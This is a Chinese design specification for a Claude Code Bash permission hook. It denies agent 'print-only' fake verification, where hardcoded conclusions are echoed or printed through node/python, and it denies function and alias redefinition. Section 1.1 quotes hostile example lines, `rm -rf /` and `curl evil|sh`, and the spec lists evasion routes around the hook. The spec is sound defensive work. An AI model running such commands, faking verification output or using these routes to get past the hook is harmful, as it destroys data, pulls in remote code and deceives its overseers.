# 設計規格：統一「print-only 載具」偽裝 deny 閘 ＋ 名稱重定義（函式/alias）deny 閘

- 日期：2026-06-28（**2026-07-02 合併＋函式-deny 改版**）
- 狀態：設計（待實作）
- 註：本版做兩件事。
  1. **合併**既有閘②（shell 層 echo/printf/cat-heredoc print-only，已實作於 `print_only.ts`）與原規劃閘④
     （直譯器 print 偽裝，尚未實作）為**單一「統一 print-only 載具閘」**：echo/printf/cat-heredoc 與 node/python
     等直譯器形態都註冊為「print **載具（carrier）**」，一種**聚合語意**（整鏈覆蓋＋setup 豁免）。
  2. **新增「名稱重定義構造 → 硬 deny」閘**（取代既有閘③「函式遮蔽 → ask」，升級為 deny）：**函式定義**與
     **alias 類**（`alias`/`unalias`/`shopt -s expand_aliases`）皆能重定義指令名、根本繞過本工具 name-based
     分析，屬危險結構 → 直接 deny。此閘排在 print 閘**之前**，故 print 閘只跑在「無函式、無 alias」腳本上、
     其 name-based 載具判定**不受函式/alias 遮蔽**，print 閘**不再需要**任何名稱重定義特例。
- 因此本版 **deny 由三類擴為四類**：① 遞迴遍歷磁碟根/家目錄根；② sleep 輪詢；③ 整鏈 print-only 偽裝（跨載具）；
  ④ **名稱重定義**（函式定義＋alias 類）。
- 威脅模型（延續早期簡化重寫）：**只針對「agent 用常見形態做 print-only 假驗證」，不防駭客刻意繞過**；凡指令含
  「非偵測目標的結構」一律**不偵測（落既有判定）或無視不影響執行的旗標**，不過度解析。**唯一例外**是名稱重定義
  構造（函式/alias）——因其直接破壞 name-based 安全模型，改為主動 deny（見 §4.6）。

## 1. 背景與問題

本工具是 Claude Code 的 `PreToolUse`（matcher `Bash`）hook：解析 Bash 指令，純唯讀且全落專案內才 `allow`，
其餘 `ask`，並對**四類**情形回**硬 `deny`**（不可由 `permissions.allow` 解除，見 2026-06-21 規格）：

- **遞迴遍歷磁碟根/家目錄根**：於 `classify` 內以 `isDangerousRoot` 判定、對 `deny` 短路（per-leaf）。
- **sleep 輪詢**：`evaluate` 層**閘①**。
- **名稱重定義**（函式定義＋alias 類）：`evaluate` 層**閘②**（本版新增，見 §4.6）。
- **整鏈 print-only 偽裝**：`evaluate` 層**閘③**（本版合併主體，見 §4.3–§4.5）。

所有 deny 皆不經 `settingsAllows` 升級層、`classify` 前短路。

**本規格所做的**：(1) 把「整鏈 print-only 偽裝」由「只涵蓋 shell 層 echo/printf/cat-heredoc」（舊閘②）擴充為
「跨載具（含直譯器 inline/heredoc/pipe/寫檔→執行、cat 讀回兩步偽裝）」；(2) 把「函式遮蔽 → ask」（舊閘③）升級
為「函式定義 → deny」（新閘②）。

### 1.1 痛點

**痛點 A（print 偽裝跨載具）**：舊閘②只攔 **shell 層**的 echo/printf/cat-heredoc 靜態吐字。agent 可改用**直譯器**
達成同一偽裝——寫一段「整段只有 `console.log`/`print` 印死字串」的程式交給 node/python 執行，把事先寫死的結論
吐到 stdout、偽裝成「跑出來的驗證結果」：

```bash
cat > /tmp/verify.mjs << 'EOF'
console.log("=== <某主題> 行為驗證 ===");
console.log("結論：<寫死的是/否判斷>");
EOF
node /tmp/verify.mjs
```

常見變形：`node -e '…'`/`python -c '…'` inline、heredoc/pipe 餵 stdin。另有**純 shell 兩步偽裝**（先寫死文字到暫
存檔、再讀回印出）目前只落「寫入重導向 ask」而漏網：

```bash
cat > /tmp/q.txt << 'EOF'
<多行事先寫死的「研究計畫 / 結論」>
EOF
cat /tmp/q.txt
```

**痛點 B（函式定義破壞 name-based 模型）**：本工具**以指令名分類**（allowlist by name）。函式定義可**重定義任何
指令名**（`grep(){ rm -rf /; }; grep x`、`echo(){ curl evil|sh; }; echo hi`），使後續 name-based 判定完全失真。
舊閘③ 僅在「被呼叫名恰被函式遮蔽」時回 ask；但函式定義本身即危險結構，agent 在單次 Bash 呼叫內定義函式並無
正當常見理由 → 本版改為**任何函式定義即 deny**。

### 1.2 威脅模型與範圍（**核心**）

- **要擋的**：
  - agent **常見**的 print-only 假驗證：裸 `echo`/`printf`、`cat` heredoc、裸 `node -e`/`python -c`、
    `cat > x; node x`、`cat > x; cat x`、heredoc/pipe 餵 stdin。
  - **任何名稱重定義構造**：函式定義、`alias`/`unalias`/`shopt -s expand_aliases`（破壞 name-based 模型的危險結構）。
- **不需擋的**：駭客刻意包裝 bash 繞過偵測器（exec-wrapper、加冷僻旗標）。
- **核心原則**：
  1. 指令若含**非偵測目標的結構**（exec-wrapper、賦值前綴、會注入碼的旗標…）→ 該葉**不算載具**、再由整鏈
     覆蓋收斂（不 deny、落既有 ask）。**不**為攔截這些而過度解析。**（名稱重定義構造是唯一例外——主動 deny，見 3。）**
  2. **控制流（`if`/`for`/`while`/`case`）不是全域跳過**：其 clause/guard 與各分支經走訪納入同一葉集、由整鏈
     覆蓋處理——含 guard/多分支引入非載具葉時覆蓋失敗 → 不 deny（安全 under-deny）；退化的全載具控制流
     （如 `for x in a b; do echo 假; done`）仍 deny（§4.4）。
  3. **名稱重定義 → deny**（閘②，§4.6）：函式定義與 alias 類皆破壞 name-based 安全模型，主動擋。此為對嚴格
     「絕不誤 deny」刻意接受的 over-deny（合法 `helper(){…}; helper`、`alias` 列出形亦被擋）——使用者定案
     「agent 不該在 Bash 呼叫內定義函式或設 alias」。
  4. **不影響「會執行什麼」的良性旗標**（`--transpile-only`/`--experimental-*`/deno `--allow-*`…）→ **已知
     nullary 者無視、繼續判定**；但**未知/可能吃值的分離裸旗標 → 保守放棄本葉定位**（fail-safe arity，§4.3.3，
     避免把旗標值誤當 `-e`/進入點而誤 deny）。
  5. 方向恆安全：**除 (3) 名稱重定義 deny（函式/alias）與 cat 讀回複合載具（§4.3.2(b)）兩處刻意 over-deny 外，
     絕不誤 deny、絕不新增 allow 路徑**。

### 1.3 已查證事實（unbash 4.0.1 ＋ 本專案 `walk.ts`，信心度：高）

1. 攤平後 `CommandInvocation` 帶 `name`/`argv`(suffix)/`assignments`(prefix)/`redirects`/`cwd`。
2. heredoc：引號分隔符（`<<'EOF'`）→ `heredocQuoted === true`、body `undefined`、不展開（靜態）；未引號含展開 →
   `body` 為結構化 Word；純文字 → 文字在 `content`。靜態性沿用 `isHeredocPrintEligible`。
3. `Pipeline.commands: Statement[]`。`staticValue(word)` 對含展開/未引號 glob 回 `null`（動態）。
4. **`definedFunctionNames(script)`（`walk.ts` 既有）遞迴掃 AST 收集**可執行位置**的靜態函式名——來源為真正的
   `Function` AST 節點，以及 heredoc body / word 內**`$()`/`<()` 命令替換所解析出的內層腳本**（會實際執行）。
   **不**把 heredoc/here-string 的**純文字 body**（引號 heredoc body 為 `undefined`；未引號純文字進 `content`）或
   **字串引數文字**當函式定義（已實測：`cat > x.sh <<'EOF'\nf(){…}\nEOF`、`echo 'f(){…}'` → 空集）。動態名
   （`staticValue` 為 null）忽略。walk 的 `case "Function"` 不下降 body，故函式定義**不產生 execution 葉**
   （正確——函式 body 未執行）。**閘② 的 deny 判定改用新的 node-based 姊妹 helper `hasExecutableFunctionDefinition`
   （§4.6，同走訪、遇任一 `Function` 節點即 true、不依賴靜態名 → fail-closed）**；`definedFunctionNames` 保留供
   理由文字/測試診斷。兩者皆為唯讀 helper，**walk 攤平不需改**。
5. hook `permissionDecision: "deny"` 阻止呼叫並回饋 `permissionDecisionReason`，優先序 `deny > ask > allow`；
   deny 理由須含①被禁止的事②為何③替代。

## 2. 目標與非目標

### 2.1 目標

- **閘②（新，deny）：name-redefinition 構造**：`evaluate` 於閘① sleep 之後、閘③ print 之前，
  `hasExecutableFunctionDefinition(script)`（函式，node-based fail-closed helper，`walk.ts`）**或**
  `hasAliasRedefinition(invocations)`（alias/unalias/`shopt -s expand_aliases`，name-based）→ deny
  （`nameRedefinitionDenyReason(kind)`）。取代舊閘③「函式遮蔽 → ask」。`definedFunctionNames` 僅供理由文字/測試診斷。
- **閘③（合併升級，deny）**：把既有 `isAllPrintOnly` 升級為統一「print 載具」框架，跨 shell/直譯器；命中即整鏈
  deny、`classify` 前短路、不可升級。因**名稱重定義構造**已由閘② deny，print 閘只跑在「無函式、無 alias」腳本 →
  其 name-based 判定**不受函式/alias 遮蔽**、**不含任何名稱重定義特例**。
- **模組結構**（維持 `src/engine/` 扁平慣例）：
  - `static_output.ts`（**新**）：靜態輸出還原原語——echo/printf/cat-heredoc → 具體輸出字串（`string | null`）；
    `wordPrintEligible`/`isHeredocPrintEligible`/fd0「最後者勝」自 `print_only.ts` 移入或 re-export。
  - `interp_payload.ts`（**新**）：`payloadIsAllStaticPrint(source, lang)`、`printExprIsStaticString`（§4.1）。
  - `print_only.ts`（**改造**）：載具框架——葉載具判定、複合載具配對、聚合入口 `printDisguiseDeny(script, initialCwd)`。
  - `evaluate.ts`：接入閘②（函式）與閘③（print）；deny 理由客製（§4.5、§4.6）。
- 全程 fail-safe：任何不確定/非目標結構 → 不 deny；`evaluate` 既有 try/catch 收斂例外為 ask；永遠 `exit 0`。

### 2.2 非目標（**刻意排除、方向安全**）

- **不**防刻意繞過：exec-wrapper（`timeout`/`command`/`env`/`nice`/`nohup`/`xargs`…）、賦值前綴、注入旗標
  （`-r`/`--require`/`--import`/`-m`/`--preload`/`--env-file`）、動態 token → 該葉不算載具、由覆蓋收斂（落 ask）。
- **不**做跨 Bash 呼叫關聯（per-call 無狀態）：呼叫1寫檔、呼叫2執行 → 不偵測。全工具所有 deny 共有的根本邊界。
- **不**處理直譯器以外語言（`bash -c`/`perl -e`/`ruby -e`/`php -r`）。
- **不**改寫入重導向/賦值前綴/中央前置任何既有判定。除 §1.2(3)(5) 記錄的函式-deny 與 cat 讀回兩處刻意 over-deny
  外，本功能**只擴充 deny、不放寬**。
- **不**改 `walk.ts` 攤平職責、不改 `CommandInvocation` 結構（函式偵測加**唯讀** helper
  `hasExecutableFunctionDefinition`，與既有 `definedFunctionNames` 同類、不動攤平與結構）。
- **動態名函式定義不再是破口**：改 node-based fail-closed 偵測後，即使函式名無法靜態還原，只要有可執行位置的
  `Function` 節點即 deny（§4.6）。故閘② 對函式定義**無 under-deny**；唯一不觸發者是「函式文字為資料」（非 AST
  `Function` 節點，本就不該 deny）。

## 3. 架構與資料流

新增邏輯只掛在 `evaluate`。`classify`/`combine`/`parse`/`walk`/各 `rules` 皆不改。

```
main.ts → evaluate(command, root, initialCwd, rules, home, trustedReadRoots)
  └─ parse → script；walk(script) → invocations[]
       ├─ 閘①(deny) ：some(name==="sleep") → deny                                   （不變）
       ├─ 閘②(deny) ：name-redefinition（hasExecutableFunctionDefinition(script) ∨ hasAliasRedefinition(invocations)）→ deny  （★新增，取代舊閘③ ask）
       ├─ invocations.length === 0 → allow（no-op）                                 （★移到閘②之後）
       ├─ 閘③(deny) ：printDisguiseDeny(script, initialCwd) → deny                   （★合併升級）
       └─ combine(invocations.map(classify))                                        （不變）
```

- **順序要點**：閘② 在閘③ 前 → print 閘只在「無函式、無 alias」腳本上執行，其 name-based 載具判定不受函式/
  alias 遮蔽（其他 mutator 為既有 out-of-scope 邊界，§5）。
- **no-op 與函式的交互（排序修正）**：現行 `evaluate` 把 `invocations.length === 0 → allow` 放在**最前**；
  但純函式定義（`f(){:;}`）walk 產 0 個 invocation，若 no-op 檢查先跑會誤放行。故本版**把 no-op allow 檢查移到
  閘②（函式）之後**——`f(){:;}` 先被閘② deny；no-op allow 僅在「無函式定義且無葉指令」（如空指令）時成立。
  閘① sleep（`some(name==="sleep")`）對 0 invocation 為 false、無害，位置在前不影響。
- 三閘皆在 `classify` 前返回 → 天生硬性、不經中央前置、不經 `settingsAllows`。`Bash(node *)`/`Bash(echo *)` 無法解除。

## 4. 詳細設計

### 4.1 述詞 `payloadIsAllStaticPrint(source, lang)`（`src/engine/interp_payload.ts`）

純函式。`lang`：python/python3 → `"py"`；node/nodejs/deno/bun/ts-node → `"js"`。回 `true`（→ 該載具視為 print）
**僅當**下列全部成立，否則 `false`（fail-safe）：

**步驟 0：資源上限**（同步 hook 須有界）
- `source` > `MAX_PAYLOAD_BYTES`（建議 64 KiB）或 tokenize token 數 > `MAX_TOKENS`（建議 20000）→ **此 payload**
  `false`，繼續掃其他候選（不全域抑制）。

**步驟 1：Tokenize**（線性掃描，依 lang）
- 跳過：空白、換行、shebang（行首 `#!`…）、註解（js `//`…行尾、`/* */`；py `#`…行尾）。
- `STRING`：js `'…'`/`"…"`、**無 `${` 的模板 `` `…` ``**；py `'…'`/`"…"`/**三引號**、含非-`f` 前綴（`r`/`b`）。
  **動態（→ `DYNAMIC`）**：含 `${` 的模板、py f-string。
- `NUMBER`：`[+-]?` 十進位/小數/指數；js 另允許 `0x`/`0o`/`0b`/底線/`n`(BigInt)。
- `NAME`（識別字，含點號鏈如 `console.log`）、`PUNCT`（`( ) , ;`）、其餘 → `OTHER`。
- 字串逸脫、未閉合引號/括號在此偵測；**任何未閉合 → `false`**。

**步驟 2：文法比對**（消費全部 token）：整串須為「一條以上 print 敘述」，每條 `PRINT_FN '(' ARG (',' ARG)* ')' ';'?`：
- `PRINT_FN`：
  - **可帶 `STRING` 或 `NUMBER`**（文字輸出 API）：js `console.log`/`info`/`warn`/`error`/`debug`；py `print`。
  - **僅 `STRING`**（write API）：js `process.stdout.write`/`process.stderr.write`；py `sys.stdout.write`/`sys.stderr.write`。
- `ARG`：恰一個 `STRING`（write API 僅此）或 `NUMBER`（僅文字輸出 API）。**不允許** `NAME`/`OTHER`/`DYNAMIC`/
  巢狀 `(`/`=`(py kwargs)。
- 須 ≥1 條。

`printExprIsStaticString(source, lang)`：供 `-p`/`--print` 用——source 須為**純字串字面量/字串串接**
（`STRING (('+') STRING)*`），非算術/呼叫/變數/模板。

> **對照「真實工作」（皆 `false`）**：`console.log(1+1)`、`"a"+"b"`、`JSON.stringify(x)`、`sorted([…])`、
> `print(json.dumps(d))`、變數 `console.log(x)`、模板 `` `${x}` ``、f-string、`import …`、`if`/`for`。
> **命中（`true`）**：多行 `console.log("…")`、`print("…")`、註解＋print、多字面量逗號、三引號/無 `${}` 模板、
> `console.error`/`process.stdout.write` 變體。

### 4.2 靜態輸出還原 `static_output.ts`（**新**）

「把 shell 靜態吐字載具還原成具體輸出字串」的純函式，回 `string | null`（`null` = 無法靜態還原）：

- `echoOutput(inv)`：echo 靜態 payload → 還原輸出（沿用 `isEchoPrintOnly` 判定與 `-e`/`-E`/反斜線 carve-out）。
- `printfOutput(inv)`：printf 靜態格式 → 還原輸出（沿用 `isPrintfPrintOnly` carve-out；含格式化轉換符/動態 → `null`）。
- `commandOutput(inv)`：`cat`/`tac` heredoc/here-string passthrough（`isCatPassthrough`＋`isHeredocPrintEligible`、
  fd0「最後者勝」）→ 還原**實際 stdout**：**`cat` 原序、`tac` 將 body 按行反轉**（tac 反向逐行）；不合格回 `null`。
  內部用底層 `heredocOutput(redirect)` 取 body 原文、再依 `inv.name` 決定是否套 tac 反轉。此為統一入口。

`wordPrintEligible`/`isHeredocPrintEligible`/fd0「最後者勝」自 `print_only.ts` 移入本檔（或於此定義、`print_only.ts`
re-export），因其同被葉載具判定、WRITE→EXEC 的 WRITE 內容還原、與 pipe producer 輸出還原共用。

**此還原能力是本版關鍵新增**：舊閘② 只需判斷「是否 print 形態」（boolean）；合併後複合載具 WRITE→EXEC(a) 需
**取得 WRITE 寫出的實際內容**餵給 §4.1 述詞、pipe 載具需**取得 producer 實際輸出**餵給述詞。

### 4.3 載具分類

一個「print 載具（carrier）」是「淨效果為靜態吐字」的單元。分**葉載具**（單一簡單 `Command`）與**複合載具**（跨葉 pattern）。

#### 4.3.1 葉載具（單一簡單 `Command`，逐指令判定、與位置無關）

> **識別 ≠ 觸發 deny**：葉載具身分逐指令判定、與位置無關；但 deny 是整鏈聚合（§4.4）——單一葉載具只有在
> **全鏈覆蓋成立**時才貢獻 deny。

- **shell 靜態吐字**（判定不變，沿用既有）：echo 靜態、printf 靜態、cat/tac heredoc/here-string passthrough。
- **直譯器 inline**（原向量 A）：`leaf.name ∈ INTERPRETERS`、依 §4.3.3 取出 inline-eval payload、payload 靜態且
  無第 2 類注入旗標前綴 → `payloadIsAllStaticPrint(payload, lang)`。`-p`/`--print` → `printExprIsStaticString`。
- **直譯器 heredoc-stdin**（原向量 B）：`leaf.name ∈ INTERPRETERS`、無 inline-eval 旗標、無 script 位置參數、
  fd0 為靜態 heredoc/here-string（fd0「最後者勝」＋`isHeredocPrintEligible`）→ body 餵述詞。無 fd0 重導向
  （繼承 stdin，hook 看不到）→ 非載具。

`INTERPRETERS = {node, nodejs, python, python3, deno, bun, ts-node}`。**子指令解析**：
- **deno**：`deno eval <payload>` → inline；`deno run -`（裸 dash，`-` 是 stdin 標記）→ heredoc-stdin；
  `deno run <file>` → 下述 WRITE→EXEC 的 EXEC。
- **bun**：`bun run <file>` → EXEC（同 `<file>` 執行）；裸 `bun` 配 heredoc/here-string → heredoc-stdin。
  **`bun run -` 的 `-` 是否為 stdin 標記待實作前以 research subagent 查證 bun 版本行為**（若非 stdin 標記則不
  觸發、屬 under-deny，安全）；§7.4 的 `bun run -` 測試須以查證結果為準、或改用裸 `bun <<'EOF'` 形式。
- **node/python/ts-node**：裸直譯器配 heredoc/here-string → heredoc-stdin（無專屬 `run` 子指令）。

#### 4.3.2 複合載具（跨葉 pattern）

- **WRITE→EXEC**（原向量 C，緊鄰前驅＋同檔比對）：由**緊鄰前一個 sibling 的靜態 WRITE** 與其後 **EXEC** 成對；
  EXEC 有兩種：
  - **(a) 直譯器執行同檔**：EXEC 葉 `name ∈ INTERPRETERS`、「script 執行」形態（非 inline、非 stdin），其
    **直譯器 script 進入點**等於 WRITE 寫出的路徑 P，且 **WRITE 內容須過 `payloadIsAllStaticPrint`**（lang 由該直譯器決定）。
    - **進入點偵測採 fail-safe 保守解析（回應 review high finding；寧 under-deny 不誤 deny）**：deno 先過 `run`
      子指令；然後由左至右掃旗標找第一個位置參數為進入點——但**只在能確定跳過量時前進**：
      - `--flag=value`（黏值形）→ arity 0、跳 1。
      - **已知 nullary 良性旗標**（`--transpile-only`/`--no-warnings`/`--experimental-*` 裸形/deno `--allow-*` 裸形/
        `-A`/`--no-check`/ts-node `--esm` 等，維護一份**小的已知 nullary 集**）→ 跳 1。
      - **任何其他分離式裸旗標**（可能吃值的良性旗標如 `--loader`/`--experimental-loader`/`--config`/`--project`/
        `-P`/`--import-map`/`--compiler`，或未知旗標）→ **無法確定其是否吃走下一個 token 為值 → 放棄進入點定位 →
        EXEC 非載具、不成對（安全 under-deny）**。
      進入點之後的 token 一律是程式 argv、不比對。故只有「真正被執行的那個檔＝P、且其前無不確定旗標」才成對：
      - 成對 deny：`cat > /tmp/x.mjs <<…; node /tmp/x.mjs`、`node --transpile-only x.ts`（x.ts=P、旗標已知 nullary）、
        `node --experimental-default-type=module x.mjs`（`=value` 形）、`deno run --allow-read x.ts`（裸 allow 已知 nullary）。
      - **不成對、不 deny**：`node runner.js generated.js`（進入點 runner.js ≠ P）、`python runner.py fixture.py`、
        `deno run runner.ts fixture.ts`（generated/fixture 只是 argv）；`node --loader fixture.js runner.js`、
        `ts-node --project cfg.json runner.ts`（`--loader`/`--project` 非已知 nullary → 放棄定位，即使 fixture/cfg
        為前驅 WRITE 亦不誤 deny）。
  - **(b) cat/tac 讀回同檔**（**新增；意識接受的 narrow over-deny exception**）：EXEC 葉 `name ∈ {cat, tac}`、
    其**唯一操作元**為 WRITE 寫出的路徑 P、無蓋過的 fd0 輸入重導向；**WRITE 內容為任何可靜態還原文字即可、
    不需過 payload 述詞**（因 composite 淨效果就是把「同呼叫內剛靜態寫死的文字」原樣吐回 stdout）。封掉
    `cat > /tmp/q.txt <<'EOF'…EOF; cat /tmp/q.txt` 兩步偽裝（目前僅落寫入重導向 ask）。
    - **rationale（使用者定案）**：讀回內容在同一呼叫內已被靜態寫死、寫它的模型早握有 → 再讀回只是「把已知
      結論繞經 tool 輸入再原樣拿回」的浪費 token 假工作，正是本閘要擋的。
    - **與「絕不誤 deny」的關係**：cat 讀回詞法上與合法「建靜態檔再檢視」（`cat > config.yaml <<EOF…EOF; cat
      config.yaml`）**無法區分**，故為對嚴格「絕不誤 deny」開的例外之一。**blast radius 受限**：deny 的是
      **同呼叫內寫死＋立即讀回同檔**這半段冗餘；**檔案「建立」本身不被永久阻擋**——單獨下 WRITE（`cat >
      config.yaml <<EOF…EOF`）＝寫入重導向 ask（可核准），需檢視時另起 `cat config.yaml`。使用者僅需把寫與讀
      拆到兩次呼叫或省去多餘讀回。
    - **鑑別器落差（明載）**：(a) 有 `payloadIsAllStaticPrint` 當鑑別器；(b) 無任何鑑別器（任何靜態文字皆命中），
      故 (b) 的 over-deny 面較 (a) 廣——使用者知悉並接受。
  - **WRITE 定義**：緊鄰前一個 sibling 葉指令，名 ∈ {`cat`,`tac`,`echo`,`printf`}、無賦值前綴、其**唯一有效
    fd1 目標**為截斷 `>`/`>|` 到靜態路徑 P、內容可由 `static_output.ts` 靜態還原。`>>` append、多重輸出重導向、
    `1>&2` 等 → 非 WRITE。
  - **緊鄰前驅**：WRITE 是 EXEC 在**同一循序序列**（`;`/newline 或 `&&` 連接的 `AndOr`）內的**緊鄰前一個
    sibling**。**WRITE 與 EXEC 之間**有任何其他 statement（含 `cd`）、或跨控制流/subshell/背景/`||` 邊界 →
    非緊鄰前驅 → 不成對。（**允許前面有其他 setup leg**——由 §4.4 的 setup 豁免處理，不在此放寬緊鄰性。）
  - **同檔比對**：以各自 statement 的 cwd 快照 `normalizeAbsolute` 後**字面相等**即同檔。cwd known 時解析絕對
    路徑比對；cwd unknown（如先前 `cd $DYN`）時，相同相對路徑字串仍同檔（同 cwd）→ 可比對；一絕對一相對且 cwd
    unknown → 無法證明 → 不成對。
  - `node --require pre.js x.mjs`（第 2 類注入旗標）→ 該 EXEC 葉跳過、不成對。
- **pipe**（原向量 D）：`Pipeline` 節點且為**恰兩段** `producer | interpreter`（多段跳過）：
  - 右段（消費者）：leaf 名 ∈ INTERPRETERS、無賦值前綴、無第 2 類旗標、stdin 形態（無 script、無 inline）、
    且**無蓋過 pipe 的 fd0 重導向**。
  - 左段（生產者）：靜態 print 生產者——`echo`/`printf` 靜態或 `cat`/`tac` 靜態 heredoc/here-string，
    以 `static_output.ts` 取其輸出字串為 source。
  - `payloadIsAllStaticPrint(source, lang)` → 成對。
  - 背景 `&`/coproc/整體 pipeline redirect → 跳過；否定 `!` 不改資料流 → 照常判。

#### 4.3.3 旗標規則（直譯器葉）

掃 `inv.argv`（靜態化）。**旗標分三類**：

1. **inline-eval 旗標**：node/bun/ts-node `-e`/`--eval`、python `-c`、`deno eval`（子指令）、`-p`/`--print`。取其值為 payload。
2. **會注入/改變執行的旗標**（出現即**跳過此葉**、不視為載具）：`-r`/`--require`/`--import`/`-m`/`--preload`/
   `--env-file`/**`--loader`/`--experimental-loader`**（後二者注入模組載入器、改變執行）。**只計 inline payload/
   script 位置參數之前的旗標**——inline-eval 值之後的 token 是程式 argv（`node -e 'console.log("x")' -r p` 的 `-r`
   在 payload 之後＝argv → 仍為載具）。
3. **不影響執行的良性旗標**——**inline（A）payload 定位與 WRITE→EXEC(a) 進入點定位皆採同一 fail-safe 保守
   arity 模型（回應 review medium/high finding）**：由左至右掃旗標，
   - `--flag=value`（黏值形）→ arity 0、略 1；
   - **已知 nullary 良性旗標**（維護一份小集合：`--transpile-only`/`--experimental-*` 裸形/`--no-warnings`/deno
     `--allow-*` 裸形/`-A`/`--no-check`/ts-node `--esm`…）→ 略 1；
   - 遇**任何其他分離式裸旗標**（可能吃走下一個 token 為值的良性旗標，或未知旗標）→ **無法確定後續 token 角色 →
     放棄本葉的載具/進入點定位（EXEC/inline 非載具、不成對）**。
   理由：**inline 與進入點皆不容「保守略 1」的模糊**——若把吃值旗標的值誤當成 `-e`/`-c` 標記或進入點會**誤 deny**
   （例：`node --title -e script.js` 中 `--title` 若吃走 `-e`，鬆散略 1 會把 `script.js` 當 inline payload）。統一
   保守解析後，方向恆 under-deny、絕不誤 deny。已知 nullary 旗標之後的 inline-eval/進入點照常判定（如
   `node --no-warnings -e '<print>'`、`node --transpile-only x.ts` 仍 deny）。

### 4.4 聚合語意 `printDisguiseDeny(script, initialCwd)`（**取代 per-leaf 短路；單一自足走訪**）

> **前提（收窄後，回應 review high finding）**：本閘（閘③）僅在閘② 未 deny 時執行，故腳本**保證無函式定義、
> 無 alias 類**——載具的 name-based 判定**不受函式/alias 遮蔽影響**、**無需任何名稱重定義處理**（舊閘②′ 的全域
> 跳過特例已移除）。**此可信性僅相對「函式/alias」而言，非普遍保證**：bash 尚有其他 command-resolution mutator
> （`hash -p`/`enable -n|-f`/`PATH` 變更/`source`·`.` 匯入）也能改變名稱解析，但那些是**全工具既有的 name-based
> 邊界**（今天就落 classify/ask、非本 spec 引入或惡化），**明列為 out-of-scope**（§5）。本閘不宣稱關閉它們。

**兩階段、單一自足走訪**（**非** per-leaf 短路、**非**跨走訪 index 對位——回應 review Finding 2）：`printDisguiseDeny`
自行對 `script` 做**一趟** source-order 前序走訪，**同時**列舉葉、分類每葉、偵測複合、記錄存在性；覆蓋判定即以
**此趟走訪列舉的葉集**為權威，不與外部 `invocations[]` 做 index 對位。

**階段 1（分類，走訪完整鏈）**：沿循序序列（`Script.commands`/`CompoundList`/`BraceGroup`/`&&`/`;` 的 `AndOr`）
thread cwd（由 `initialCwd`；遇 `cd` 後標 unknown）、維護「緊鄰前一個 sibling 的靜態 WRITE」`prevWrite`，並**下降**
控制流 body、subshell `( )`、命令替換 `$( )`（與 `walk` 相同的下降規則）。對每個簡單 `Command` 葉，就地記錄身分：
{`葉載具`｜`複合成員:write-exec`｜`複合成員:pipe`｜`setup 白名單葉`｜`以上皆非`}，並記錄是否存在 ≥1 個 **WRITE→EXEC**
複合載具（供 setup 豁免；**pipe 不觸發 setup 豁免**）。
- **葉載具**（§4.3.1）逐指令判定。
- **複合成員**：`prevWrite` 與當前葉成對（§4.3.2）時，把兩葉就地標為 `複合成員:write-exec`；`Pipeline` 節點兩段
  成對時把 producer 與 consumer 兩葉標為 `複合成員:pipe`（**必要契約**——裸 consumer 本身非葉載具，唯有成對後
  被標為複合成員才使覆蓋通過，否則 `echo 'console.log(1)' | node` 會因 node 非載具而覆蓋失敗）。WRITE→EXEC 與
  pipe **僅在循序序列/pipeline 節點上判**、不跨控制流/subshell 邊界。
- **`||` 的處理（回應 structural advisory）**：`||` 的成員葉**照常全部納入覆蓋葉集**（覆蓋 (a) 對所有葉施加，
  與 `&&`/`;` 無異）；但 WRITE→EXEC 的**緊鄰前驅 adjacency 在 `||` 邊界重置**（`prevWrite` 不跨 `||` 傳遞，
  即 `cat > x <<EOF…EOF || node x` 不成對）。即：`||` 不影響「哪些葉要被覆蓋」，只影響「WRITE 與 EXEC 是否算緊鄰」。
- **自足性（回應 review Finding 2）**：分類與複合偵測在**同一趟走訪、對同一批葉物件**進行，**無** index 對位、
  **無**兩趟走訪發散風險。此走訪的下降規則與 `walk` 一致（同為前序、同下降；文件化契約），故其葉集與工具其餘
  部分所見一致；但本閘之正確性**自足於本趟走訪**，不依賴外部 `invocations[]` 的順序或長度。

**階段 2（判定，走訪結束後才決定）**：**整鏈 deny ⟺ 同時滿足**：

- **(a) 覆蓋**：**本趟走訪列舉的每個葉**身分 ∈ { `葉載具`, `複合成員:write-exec`, `複合成員:pipe` }。**唯一例外**：
  若鏈中含 ≥1 個 **WRITE→EXEC 複合載具**，則額外允許 **setup 白名單** `{mkdir, cd, true, :}` 的葉（**裸 print 鏈與
  pipe 鏈——不含 WRITE→EXEC——不吃此豁免**）。setup 白名單葉若處於**否定（`!`）之下**不算 setup（`! true` 排除）。
- **(b) 存在**：至少一個 print 載具（葉載具或複合載具）。
- **(c) 未被函式/alias 遮蔽**：**由閘② 保證**——腳本無函式定義、無 alias 類（否則已被閘② deny），故載具名不被
  函式/alias 遮蔽。本閘無需自行處理。（其他 mutator 如 `hash`/`enable`/`PATH` 為既有 out-of-scope 邊界，§5。）

**控制流路徑不敏感（安全 under-deny）**：clause/guard 與所有分支一併納入葉集、覆蓋 (a) 施加於此完整集、不區分
互斥路徑。含 guard 或多分支引入非載具葉即 (a) 失敗 → 不 deny。`if command -v node; then node -e '<print>'; else
echo 假; fi` 不 deny（guard 非載具）；`if true; then echo 假; fi` 不 deny（clause `true` 非載具）；退化全載具
`for x in a b; do echo 假; done` 仍 deny（與舊閘② 一致、無回歸）。

**行為對照**（每案於 §7 有對應測試）：

| 指令 | 判定 | 說明 |
|---|---|---|
| `echo a; echo b` | **deny**（閘③）| 純 shell 整鏈 print（舊閘② 不變）|
| `echo a; node -e 'console.log("b")'` | **deny**（閘③）| 新增：混載具全 print 鏈 |
| `ls; node -e 'console.log("假")'` | ask | (a) 失敗；per-leaf 弱化為整鏈，落既有判定 |
| `ls; echo 假` / `pwd; echo 假` | ask | 洗白繞道維持（(a) 失敗）|
| `true && echo 已驗證` | ask | 裸 print 鏈不吃 setup 豁免 |
| `cat > x <<'EOF'…EOF; cat x` | **deny**（閘③ cat-readback）| 新增：兩步偽裝 |
| `cat > x <<'EOF'…EOF; node x` | **deny**（閘③ write-exec）| 原向量 C(a) |
| `node runner.js generated.js`（generated 為前驅 WRITE）| ask | 進入點 runner.js ≠ P → 不成對 |
| `mkdir -p /tmp && cat > x <<EOF…EOF && node x` | **deny**（閘③）| setup 豁免生效 |
| `false && cat > x && node x` | ask | false 非白名單、非載具 → (a) 失敗 |
| `! true && cat > x && node x` | ask | `! true` 明文排除 setup |
| `echo 假; ls` | ask | 兩階段：走完全鏈才判、不誤 deny 前綴 |
| `echo 'console.log(1)' \| node` | **deny**（閘③ pipe）| 成對後 node 才被覆蓋 |
| `for x in a b; do echo 假; done` | **deny**（閘③）| 退化全載具控制流；與舊閘② 一致 |
